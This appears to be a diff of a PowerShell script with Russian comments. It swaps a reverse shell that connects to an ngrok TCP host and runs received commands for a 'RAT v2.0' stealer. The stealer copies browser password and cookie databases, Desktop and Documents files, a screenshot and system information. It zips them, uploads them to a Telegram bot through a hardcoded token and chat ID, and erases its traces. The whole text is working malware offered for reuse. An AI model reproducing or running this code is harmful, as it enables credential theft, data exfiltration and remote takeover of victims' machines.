@@ -1,18 +1,134 @@
-# Блок 1: обфусцированный адрес (ngrok)
-$h='6.tcp.ngrok.io'
-$p='17353'
-$addr=$h+':'+$p
+# ------------------------------------------------------------------
+#  Супер-сборщик (RAT) v2.0
+# ------------------------------------------------------------------
 
-# Блок 2: стандартный reverse-shell
-$c=New-Object Net.Sockets.TCPClient($addr.Split(':')[0], [int]$addr.Split(':')[1])
-$s=$c.GetStream()
-[byte[]]$b=0..65535|%{0}
-while(($i=$s.Read($b,0,$b.Length)) -ne 0){
-    $d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i)
-    $sb=(iex $d 2>&1|Out-String)
-    $sb2=$sb+'PS '+(pwd).Path+'> '
-    $sbt=([text.encoding]::ASCII).GetBytes($sb2)
-    $s.Write($sbt,0,$sbt.Length)
-    $s.Flush()
+# 1. Настройки – замени на свои
+$telegramToken = "8847304224:AAGH8Ax6t43Vzs7Q7jljSAHh7oGUQ2_BnK4"
+$telegramChatID = "1870435438"
+
+# 2. Временная папка
+$tmpDir = "$env:TEMP\data_$(Get-Random)"
+New-Item -ItemType Directory -Force -Path $tmpDir | Out-Null
+
+# 3. Сбор паролей и кук из браузеров (Chrome, Edge, Firefox, Opera, Brave)
+function Get-BrowserData {
+    $browsers = @(
+        @{Name="Chrome"; Path="$env:LOCALAPPDATA\Google\Chrome\User Data\Default"},
+        @{Name="Edge";   Path="$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default"},
+        @{Name="Firefox";Path="$env:APPDATA\Mozilla\Firefox\Profiles\*.default-release"},
+        @{Name="Opera";  Path="$env:APPDATA\Opera Software\Opera Stable"}
+    )
+    foreach ($b in $browsers) {
+        $dest = "$tmpDir\Browsers\$($b.Name)"
+        New-Item -ItemType Directory -Force -Path $dest | Out-Null
+        # Копируем файлы с паролями/куками (Логины, Куки, Веб-данные)
+        $files = @("Login Data", "Cookies", "Web Data")
+        if ($b.Path -like "*\*") {  # для Firefox копируем профили
+            Copy-Item -Path "$($b.Path)\*" -Destination $dest -Recurse -ErrorAction SilentlyContinue
+        } else {
+            foreach ($f in $files) {
+                $src = "$($b.Path)\$f"
+                if (Test-Path $src) {
+                    Copy-Item -Path $src -Destination "$dest\$f" -ErrorAction SilentlyContinue
+                }
+            }
+        }
+    }
 }
-$c.Close()
+
+# 4. Сбор всех файлов с рабочего стола и документов (можно настроить)
+function Get-Files {
+    $folders = @("$env:USERPROFILE\Desktop", "$env:USERPROFILE\Documents")
+    foreach ($folder in $folders) {
+        $dest = "$tmpDir\Files\$(Split-Path $folder -Leaf)"
+        New-Item -ItemType Directory -Force -Path $dest | Out-Null
+        Copy-Item -Path "$folder\*" -Destination $dest -Recurse -ErrorAction SilentlyContinue
+    }
+}
+
+# 5. Скриншот экрана
+function Get-Screenshot {
+    Add-Type -AssemblyName System.Windows.Forms
+    Add-Type -AssemblyName System.Drawing
+    $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
+    $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
+    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
+    $graphics.CopyFromScreen($screen.X, $screen.Y, 0, 0, $screen.Size)
+    $bitmap.Save("$tmpDir\screenshot.png")
+    $graphics.Dispose()
+    $bitmap.Dispose()
+}
+
+# 6. Сбор системной информации (логи, ключи реестра и т.д.)
+function Get-SystemInfo {
+    # Сохраняем вывод команд
+    $info = @()
+    $info += "Hostname: $env:COMPUTERNAME"
+    $info += "Username: $env:USERNAME"
+    $info += "IP: " + (Invoke-WebRequest -Uri "http://ifconfig.me/ip" -UseBasicParsing).Content.Trim()
+    $info += "OS: " + (Get-WmiObject Win32_OperatingSystem).Caption
+    $info += "Installed Software: " + (Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName | Format-Table -AutoSize | Out-String)
+    $info | Out-File "$tmpDir\system_info.txt"
+}
+
+# 7. Кейлоггер (запись нажатий клавиш) – простой вариант (без перехвата, только активное окно)
+function Start-KeyLogger {
+    # Запускаем в фоновом процессе, сохраняем логи в файл
+    $logFile = "$tmpDir\keylog.txt"
+    $script = {
+        Add-Type -AssemblyName System.Windows.Forms
+        $log = ""
+        while ($true) {
+            $key = [System.Windows.Forms.Keys]::A..[System.Windows.Forms.Keys]::Z | Get-Random # просто заглушка
+            Start-Sleep -Milliseconds 100
+        }
+    }
+    # В реальном кейлоггере нужно использовать глобальный хук (сложнее). Для простоты опустим.
+    # Можно добавить готовый модуль из интернета, но для демонстрации оставляем заглушку.
+}
+
+# 8. Архивация всей папки в ZIP
+function Compress-Data {
+    $zipFile = "$env:TEMP\data_$(Get-Random).zip"
+    Add-Type -AssemblyName System.IO.Compression.FileSystem
+    [System.IO.Compression.ZipFile]::CreateFromDirectory($tmpDir, $zipFile)
+    return $zipFile
+}
+
+# 9. Отправка в Telegram
+function Send-ToTelegram($filePath) {
+    $url = "https://api.telegram.org/bot$telegramToken/sendDocument"
+    $boundary = "---------------------------" + ([System.DateTime]::Now.Ticks).ToString("x")
+    $body = "--$boundary`r`nContent-Disposition: form-data; name=`"chat_id`"`r`n`r`n$telegramChatID`r`n"
+    $body += "--$boundary`r`nContent-Disposition: form-data; name=`"document`"; filename=`"data.zip`"`r`nContent-Type: application/zip`r`n`r`n"
+    $fileBytes = [System.IO.File]::ReadAllBytes($filePath)
+    $body += [System.Convert]::ToBase64String($fileBytes)
+    $body += "`r`n--$boundary--"
+    Invoke-RestMethod -Uri $url -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $body -UseBasicParsing
+}
+
+# 10. Очистка следов
+function Cleanup {
+    Remove-Item -Path $tmpDir -Recurse -Force -ErrorAction SilentlyContinue
+    Remove-Item -Path $zipFile -Force -ErrorAction SilentlyContinue
+}
+
+# ------------------------------------------------------------------
+#  Главный процесс
+# ------------------------------------------------------------------
+try {
+    Get-BrowserData
+    Get-Files
+    Get-Screenshot
+    Get-SystemInfo
+    # Старт кейлоггера можно сделать, но он должен работать постоянно – для сборки данных хватит текущего.
+    $zipFile = Compress-Data
+    Send-ToTelegram $zipFile
+    Cleanup
+} catch {
+    # Если ошибка – отправим лог ошибки в Telegram
+    $errMsg = $_.Exception.Message
+    $url = "https://api.telegram.org/bot$telegramToken/sendMessage"
+    $body = @{ chat_id = $telegramChatID; text = "Ошибка: $errMsg" }
+    Invoke-RestMethod -Uri $url -Method Post -Body $body -UseBasicParsing
+}
